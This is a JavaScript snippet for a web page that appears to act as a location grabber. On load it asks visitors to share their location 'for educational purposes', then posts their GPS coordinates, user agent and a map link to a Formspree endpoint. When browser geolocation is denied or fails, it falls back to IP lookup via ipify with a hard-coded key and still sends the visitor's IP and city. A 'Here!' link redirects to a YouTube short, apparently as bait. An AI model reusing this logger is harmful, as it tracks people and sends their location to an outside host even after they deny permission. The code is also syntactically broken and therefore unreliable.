
    // Seu endpoint do Formspree
    const formspreeEndpoint = "https://formspree.io/f/xpwynkqn";

    // Sua chave do ipify Geo API
    const ipifyKey = "at_qJQg5RedA4H2Kd9IGXn7PzqG24UOc";

    // Cookie helpers
    function setCookie("Aceitapeloamordedeus", "1", 365) {
      const d = new Date();
      d.setTime(d.getTime() + (days*24*60*60*1000));
      document.cookie = `${name}=${encodeURIComponent(value)};path=/;expires=${d.toUTCString()};SameSite=Lax`;
    }
    function getCookie(name) {
      return document.cookie.split('; ').reduce((res, c) => {
        const [k, v] = c.split('=');
        return k === name ? decodeURIComponent(v) : res;
      }, null);
    }

    function sendToFormspree(payload) {
      return fetch(formspreeEndpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    }

    // função para fallback por ipify Geo API
    function getIPGeoFallback() {
      const statusEl = document.getElementById('status');
      if (statusEl) statusEl.textContent = "Status: fallback por ipify Geo API...";

      const url = `https://geo.ipify.org/api/v2/country,city?apiKey=${ipifyKey}`;

      fetch(url)
        .then(r => r.json())
        .then(info => {
          const payload = {
            timestamp: new Date().toISOString(),
            ip: info.ip,
            latitude: info.location.lat,
            longitude: info.location.lng,
            city: info.location.city,
            region: info.location.region,
            country: info.location.country,
            google_maps_link: info.location.lat && info.location.lng ? `https://www.google.com/maps?q=${info.location.lat},${info.location.lng}` : null,
            user_agent: navigator.userAgent,
            note: "Localização aproximada via ipify Geo API (fallback)"
          };

          if (statusEl) statusEl.textContent = `Status: localização aproximada (${info.location.city || 'n/a'}, ${info.location.region || ''}). Enviando...`;

          return sendToFormspree(payload);
        })
        .then(() => {
          const statusEl = document.getElementById('status');
          if (statusEl) statusEl.textContent = "Status: dados enviados (fallback ipify).";
        })
        .catch(err => {
          console.warn(err);
          const statusEl = document.getElementById('status');
          if (statusEl) statusEl.textContent = "Status: erro ao obter IP/geo (ipify).";
        });
    }

    // requisita geolocalização precisa
    function requestPreciseGeo() {
      const statusEl = document.getElementById('status');
      if (!("geolocation" in navigator)) {
        if (statusEl) statusEl.textContent = "Status: navegador não suporta geolocation.";
        getIPGeoFallback();
        return;
      }

      if (statusEl) statusEl.textContent = "Status: solicitando permissão para localização precisa...";
      const options = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };

      navigator.geolocation.getCurrentPosition(async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const acc = pos.coords.accuracy;

        if (statusEl) statusEl.textContent = `Status: localização obtida (±${Math.round(acc)} m). Enviando...`;

        const payload = {
          timestamp: new Date().toISOString(),
          latitude: lat,
          longitude: lon,
          accuracy_meters: acc,
          google_maps_link: `https://www.google.com/maps?q=${lat},${lon}`,
          user_agent: navigator.userAgent,
          note: "Precise via navigator.geolocation (user consent)"
        };

        await sendToFormspree(payload);

        if (statusEl) statusEl.textContent = `Status: dados enviados com sucesso. Localização: ${lat.toFixed(6)}, ${lon.toFixed(6)} (±${Math.round(acc)} m)`;
      }, (err) => {
        console.warn("Geolocation error:", err);
        if (statusEl) statusEl.textContent = "Permissão negada ou erro. Usando fallback por IP...";
        getIPGeoFallback();
      }, options);
    }

    // fluxo com cookie
    function startGeoWithCookie() {
      const statusEl = document.getElementById('status');
      const consent = getCookie('ff_geo_consent');

      if (consent === 'accepted') {
        if (statusEl) statusEl.textContent = "Status: consentimento prévio detectado. Solicitando localização...";
        requestPreciseGeo();
        return;
      }
      if (consent === 'declined') {
        if (statusEl) statusEl.textContent = "Status: coleta recusada anteriormente (cookie).";
        return;
      }

      // sem cookie: pede confirmação
      const want = confirm("Este site solicita sua localização precisa (GPS) para fins educacionais. Você aceita compartilhar sua localização?");
      if (want) {
        setCookie('ff_geo_consent', 'accepted', 365);
        requestPreciseGeo();
      } else {
        setCookie('ff_geo_consent', 'declined', 365);
        if (statusEl) statusEl.textContent = "Status: você recusou a coleta de localização (cookie gravado).";
      }
    }

    window.addEventListener('load', startGeoWithCookie);

    // link Click here
    const here = document.getElementById('Here!');
    if (here) {
      here.addEventListener('click', function(event) {
        event.preventDefault();
        window.location.href = 'https://youtube.com/shorts/UM7TpdnbWfY?si=d_vDGrLYHqp5QZys';
      });
